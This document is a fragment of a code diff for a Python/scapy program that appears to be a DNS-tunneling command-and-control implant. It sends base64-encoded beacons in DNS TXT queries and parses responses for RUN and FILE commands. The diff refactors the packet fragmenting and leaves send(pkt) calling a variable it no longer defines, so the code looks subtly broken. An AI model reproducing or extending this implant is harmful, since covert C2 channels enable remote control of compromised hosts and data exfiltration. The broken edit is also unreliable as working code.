@@ -11,7 +11,7 @@ def bin_to_str(bin_data):
 def send_beacon(addr,bin_data):
     while cond == 0:
         data = base64.b64encode(bin_data).decode('ascii')
-        pkt = IP(dst=addr)/UDP(sport=1234)/DNS(qd=DNSQR(qtype="TXT", qname=data))
+        frag_and_send(None,data,1,0,data)
         send(pkt)
         print("send beacon")
         time.sleep(5)        
@@ -29,8 +29,8 @@ def parse_packet(packet):
         base64_rdata = packet[1][DNSRR].rdata[0]
         base64_rdata_padded = add_padding(base64_rdata)
         rdata = base64.b64decode(base64_rdata_padded)
-        prefix_packet = rdata[:6]
-        data_recieved = rdata[6:]
+        prefix_packet = rdata[:PREFIX_SIZE]
+        data_recieved = rdata[PREFIX_SIZE:]
         if prefix_packet == RUN or prefix_packet == FILE:
             txt_recieved = bin_to_str(data_recieved)
             if prefix_packet == RUN:
